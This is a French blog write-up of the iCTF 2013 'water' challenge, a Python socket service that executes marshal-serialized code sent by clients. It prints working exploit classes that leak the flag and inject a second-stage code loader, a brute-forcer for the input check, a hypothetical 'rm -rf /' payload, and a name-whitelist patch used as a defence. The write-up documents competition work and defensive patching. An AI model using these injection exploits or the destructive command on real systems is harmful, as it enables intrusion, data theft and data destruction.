Date: 23/03/2013
Title: Writeup iCTF 2013 : Water
Slug: writeup-ictf-2013-water

Vendredi, j'ai participé avec l'équipe des EpicLyons à la session 2013 de l'iCTF (censée avoir lieu en décembre dernier, mais repoussée), qui est un concours de sécurité international entre écoles, organisé par l'UCSB.
Le principe était sympathique, chaque équipe avait accès à un serveur en SSH, et sur ce serveur tournaient différents services en écoute sur un port (une dizaine de services environ). Parmi ces services, nous avions des binaires C, des scripts Python2 (certains compilés, d'autres non), du Javascript (node.js), et même du COBOL (beau troll).
L'objectif était de comprendre le fonctionnement de ces différents programmes, de découvrir leurs failles, et d'écrire un exploit (en python 2.7 et en respectant un certain format) pour, eh bien, exploiter cette faille. Pour nous défendre, nous pouvions patcher nos programmes et les relancer, mais nous avions également la possibilité d'utiliser un genre d'IDS pour bloquer les paquets avant qu'ils ne parviennent au programme (voilà en gros l'idée, je n'ai pas étudié cet aspect là du concours).
Nos exploits ne devaient pas perturber la machine ennemie mais seulement voler furtivement des flags (des valeurs qui pouvaient se trouver dans un fichier, dans une base de donnée, ou en mémoire dans le programme).
Ces flags étaient régulièrement mis à jour par l'organisation, du moins dans le cas que je présente ensuite, grâce à une faille permettant d'injecter et d'exécuter n'importe quel code dans le programme.

Le concours aura été marqué par de gros problèmes d'infrastructure, ce qui a empêché le bon déroulement des attaques (pour notre équipe comme pour les autres), et donc la possibilité d'acquérir des informations à partir des paquets à destination de notre serveur.

Bref, pour ma part, je me suis concentré sur le service "water", composé de deux scripts python non compilés (dans le cas de scripts Python2 compilé, l'outil [uncompyle2](https://github.com/wibiti/uncompyle2) fonctionne pas mal).

Voici ces deux fichiers :

`WaterSystemServer.py`

    :::python
    from socket import *
    from MeasurementLib import *
    import base64
    import marshal
    import thread
    import types

    flag = None
    cookie = None
    flag_id = None

    measurements = set([])

    def connection_handler(clientsock,addr):
      try:
        clientsock.send("Welcome back. Please insert your measurement\n:")
        data = clientsock.recv(BUFSIZ)
        if not data: return
        r = calculate(data)
        if not r:
          if int(data.split(',')[-1]) == flag_id:
            clientsock.send("%s\n"%flag)
          clientsock.close()
        else:  
          if data in measurements:
            clientsock.send("Thanks, but we have already seen this measurement\n")
            clientsock.close()
          else:
            measurements.add(data)
            clientsock.send("Floods ahead! Please enter your command\n:")
            data = clientsock.recv(BUFSIZ)
            types.FunctionType(marshal.loads(base64.b64decode(data)), globals(), "callback")(clientsock)
            clientsock.close()
      except Exception as e: print e
      return

    if __name__ == "__main__":
      
      HOST = "0.0.0.0"
      PORT = 3333
      BUFSIZ = 1024
      ADDR = (HOST, PORT)
      serversock = socket(AF_INET, SOCK_STREAM)
      serversock.bind(ADDR)
      serversock.listen(2)

      while True:
        clientsock, addr = serversock.accept()
        thread.start_new_thread(connection_handler, (clientsock, addr))
      serversock.close()

`MeasurementLib.py`

    :::python
    import math

    def calculate(sequence):
        m = []
        for i in range(1, 10):
            m.append(math.log10(1 + 1.0 / i))

        nums = [x[0] for x in sequence.split(",")]

        o = {}

        for num in nums:
            if num in o:
                o[num] += 1
            else:
                o[num] = 1

        if len(o) != 9:
            return False
        else:
            for d in sorted(o):
                cond1 = float(o[d]) / sum([int(x) for x in o.values()]) >= m[int(d)-1] - 0.05
                cond2 = float(o[d]) / sum([int(x) for x in o.values()]) <= m[int(d)-1] + 0.05
                if not (cond1 and cond2):
                    return False

        return True

Il s'agit donc d'un serveur en écoute sur le port 3333. Quand un client s'y connecte, il lui demande une liste de mesures (une chaine contenant des chiffres séparés par virgule, du genre : `"1,4,3,2,8,1,9,5"`), et appelle la fonction `calculate` avec cette chaine en paramètre.

La logique de ce que fait la fonction `calculate` m'est encore tout à fait obscure. Tout d'abord, il faut nécessairement qu'il y ai 9 chiffres distincts dans cette chaîne (chaque chiffre peut apparaître plusieurs fois). La fonction se base sur les valeurs de ces chiffres, et sur leur nombre d'occurence, mais leur ordre n'a pas d'importance. Elle effectue certains calculs et compare ces vérifie que le résultat est dans l'intervalle `[x - 0.5 ; x + 0.5]`, où `x` est le logarithme à base 10 de... **bref**. Si on a une bonne série de valeurs, la fonction renvoie vraie, et faux sinon.

Si la chaîne renvoie faux
-------------------------
C'est le cas le plus simple à obtenir, n'importe quelle chaine faisant a priori l'affaire.
Et nous pouvons donc facilement récupérer un flag grâce à la ligne `clientsock.send("%s\n"%flag)` !
Il suffit que la chaîne contienne le flag_id :

    :::python
    >>> flag = "secret"
    >>> flag_id = 42
    >>> data = "42"  # notre chaine
    >>> if int(data.split(',')[-1]) == flag_id:
    ...     print "envoi du flag :", flag
    ...     
    ... 
    envoi du flag : secret

Un exploit respectant le format demandé serait donc :

    :::python
    class Exploit():

        def execute(self, ip, port, flag_id):
            # notre code ici :
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.recv(1024)
            s.send(flag_id)
            self.flag = s.recv(1024)[:-1]  # vire le \n final

        def result(self):
            return {'FLAG' : self.flag }

L'exploit a été testé en local, mais pas sur notre serveur, car nous ne savions pas quel `flag_id` résidait en mémoire (en effet, au lancement, `flag` et `flag_id` valent `None`). Il aurait été intéressant de tester l'outil [pyrasite](https://github.com/lmacken/pyrasite) pour voir leur valeur.
Toujours est il que cet exploit a été soumis mais n'a pas été accepté (peut être à cause d'un oubli de conversion du flag_id en chaîne dans le `s.send(flag_id)`, ou peut être simplement parce qu'il s'agissait là d'un exploit trop évident qu'ils refusaient d'accepter).

Si la chaîne renvoie vrai
-------------------------
Là, c'est plus délicat. Déjà parce que, comme dit précédemment, pour savoir quelle séquence de chiffre mettre, il faut en vouloir. Ensuite parce que, si la chaine qu'on leur envoi leur a déjà été envoyée, la connexion se ferme. Et pour finir, c'est délicat parce que la ligne :

    :::python
    # data = clientsock.recv(BUFSIZ)
    types.FunctionType(marshal.loads(base64.b64decode(data)), globals(), "callback")(clientsock)

qui est la seule ligne ayant de l'intérêt a priori, est très obscure au premier abord.

En réalité, ce n'était pas si délicat :
  - la séquence de chiffre pouvait être bruteforcée
  - pour ne pas renvoyer tout le temps la même (nos exploits étant rejoués plusieurs fois), on pouvait se contenter de mélanger les chiffres la composant avec un `shuffle` (ou même en bruteforcer une autre, avec l'avantage d'éviter les patchs concernant notre suite de valeurs)
  - la ligne obscure a en gros pour effet d'exécuter du code python contenu dans data, c'est à dire des données que nous envoyons !

### Bruteforce
Une version stupide (ne checke pas qu'on a bien 9 chiffres distincts) :

    :::python
    def bruteforce(longueur=42, essais=1000000):
        for i in xrange(essais):
            entiers = (str(random.randint(1, 9)) for i in xrange(longueur))
            chaine = ','.join(entiers)
            if calculate(chaine):
                return chaine
    # ex : "1,1,4,5,1,6,9,7,6,8,9,1,7,3,1,7,9,2,5,3,3,1,2,8,1,3,5,2,2,2,4,1,9,1,6,2,8,6,2,1,1,2"

### La ligne obscure
Décortiquée, ça donne :

    :::python
    # data = clientsock.recv(1024)  # on reçoit max 1024 catactères
    data = base64.b64decode(data)  # ces données étaient encodées en base64, on les décode
    data = marshal.loads(data)  # ces données contenaient un objet python sérialisé, on le recrée
    fonction = types.FunctionType(data, globals(), "callback")
    fonction(clientsock) # on appelle la fonction nouvellement créée avec le socket en paramètre

La ligne non commentée a pour effet de créer une fonction dont le code du corps est `data` (`data` doit donc être un objet python de `<type 'code'>`), avec l'environnement `globals()` (autrement dit, cette fonction aura accès aux modules, variables et fonctions globales du programme). Pas compris à quoi servait le paramètre "callback" en revanche.

Cette fonction pourrait donc accéder aux variables globales `flag` et `flag_id` ! Et pour les envoyer, il suffit d'utiliser `clientsock` passé en paramètre :). Une fonction qui ferait le boulot qu'on veut serait :

    :::python
    def f(sock):  # sock == clientsock
        sock.send("{}#{}".format(flag, flag_id))

Il faut ensuite récupérer un *"objet python correspondant au code de cette fonction"*, le sérialiser à l'aide du module marshal, et l'encoder en base64.

    :::python
    import types, marshal, base64
    code = f.func_code  # merci SO : http://stackoverflow.com/a/10303539/2162761
    serialized = marshal.dumps(code)
    serialized_base64 = base64.b64encode(serialized)

Il suffit d'envoyer la chaine `serialized_base64` et d'attendre ensuite de réceptionner le `flag` et le `flag_id` :

    :::python
    s.send(serialized_base64)
    string = s.recv(1024)
    f, fid = string.split('#')
    print "flag : {} / flag_id : {}".format(f, fid)

Cette technique suffit donc pour récupérer le flag en mémoire, mais peut potentiellement être beaucoup plus puissante puisqu'on peut injecter ce que bon nous semble. Cependant, notre créativité est limitée à 1024 caractères à cause du "`data = clientsock.recv(BUFSIZ)`". On peut dépasser cette limitation en refaisant des `recv` en boucle pour à nouveau récupérer le code d'une fonction à exécuter.

Voici l'exploit global utilisant cette technique et tout ce qui a été décrit auparavant :

    :::python
    class Exploit():

        def execute(self, ip, port, flag_id2):

            def brute():
                from random import shuffle
                copie = [1,1,4,5,1,6,9,7,6,8,9,1,7,3,1,7,9,2,5,3,3,1,2,8,1,3,5,2,2,2,4,1,9,1,6,2,8,6,2,1,1,2]
                shuffle(copie)
                return ','.join((str(i) for i in copie))

            def func_code(which):
                import base64
                import marshal
                # les fonctions a executer chez la victime ('s' == le socket)
                if which == 1:
                    def f(s):
                        s.send(":)")
                        data = ""
                        while not data.endswith("OKAYDONE"):
                            data += s.recv(1024)
                        import base64, marshal, types
                        data = marshal.loads(base64.b64decode(data[:-8]))
                        types.FunctionType(data, globals(), "callback")(s)
                elif which == 2:
                    def f(s):
                        # put your nasty code here
                        s.send("{}#{}".format(flag, flag_id))
                function_serialized = base64.b64encode(marshal.dumps(f.func_code))
                return function_serialized

            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            print ">>>", s.recv(1024)  # blabla
            s.send(brute())
            print ">>>", s.recv(1024)  # blabla
            s.send(func_code(1))
            print ">>>", s.recv(1024)  # notre blabla
            s.send(func_code(2))
            s.send("OKAYDONE")
            # maintenant notre code s'execute...
            string = s.recv(1024)  # et nous renvoie un flag
            f, fid = string.split('#')
            print "flag : {} / flag_id : {}".format(f, fid)
            if isinstance(flag_id2, int):
                fid = int(fid)
            if flag_id2 == fid:
                self.flag = f

        def result(self):
            return {'FLAG' : self.flag }

Nous avons ensuite recherché comment utiliser cet exploit à d'autre fins, typiquement en allant chercher des flags dans d'autres fichiers ou dossiers, mais les droits de l'utilisateur `water` (celui par qui ce service était lancé) étaient insuffisants pour pénétrer dans les dossiers intéressants.
De plus, les règles du concours interdisaient les exploits visant à perturber le système de l'ennemi, un tel exploit aurait donc probablement été refusé. Il était également interdit d'utiliser autre chose que python pour les exploits et d'utiliser `os.system()` (ou similaire) pour exécuter du bash / perl / whatever.
Sans cette limitation, potentiellement, un simple :

    :::python
    def f(s):
        import os
        os.system("rm -rf /")

aurait pu faire très mal à ceux qui avaient relancé malencontreusement le service `water` avec l'utilisateur `root` !

### Mesure de protection et patch
Pour nous protéger des exploits ennemis, nous ne pouvions nous contenter de killer le service ou de bloquer l'exécution de code arbitraire car c'est de cette manière que les organisateurs venaient `setter` les flags en mémoire chez nous. Ils devaient également avoir la possibilité de vérifier que nos flags étaient bien ceux qu'ils positionnaient, mais c'est probablement à l'aide de la technique triviale du début de cet article qu'ils parvenaient à cela.

Pour avoir une idée du code qu'ils nous injectaient, il suffit de logger certaines infos sur ce code :

    :::python
    # patch de WaterSystemServer.py
    data = clientsock.recv(BUFSIZ)
    dat = marshal.loads(base64.b64decode(data))
    with open('./infos.log', 'a') as logfile:
      logfile.write("code names : {} / code consts : {} \n".format(dat.co_names, dat.co_consts))
    types.FunctionType(marshal.loads(base64.b64decode(data)), globals(), "callback")(clientsock)

Nous avons pu constater que leur code ne contenait que les identifieurs `globals`, `clientsock`, `recv`, et quelques autres (que j'ai oubliés), mais en tout cas, pas de `send`, `sendall`, `FunctionType`, `exec`, etc. 
Une manière de nous protéger sans empêcher les injections de code légitime de la part des administrateur est de vérifier que le code reçu ne contient que les identificateurs "légitimes", ou ne contient pas ceux "manifestement illégitimes". La première solution est très restrictive, mais convenait parfaitement :

    :::python
    names_recv = set(dat.co_names)
    names_ok = set(['globals', 'clientsock', 'recv', 'etc.'])
    if names_recv.issubset(names_ok):
        # le code est safe, on peut l'injecter :
        types.FunctionType(marshal.loads(base64.b64decode(data)), globals(), "callback")(clientsock)


Conclusion
==========

Il est satisfaisant de comprendre, exploiter et patcher un service dans sa globalité, en découvrant au passage quelques fonctions de modules standards tels que `marshal`, `dis` ou `types.FunctionType`.
Un challenge qui me parait plus costaud serait sur un service python compilé, où uncompyle2 échouerait à obtenir quoi que ce soit. Heureusement, le dernier numéro HS de GNU/Linux mag contient de la lecture à ce sujet :).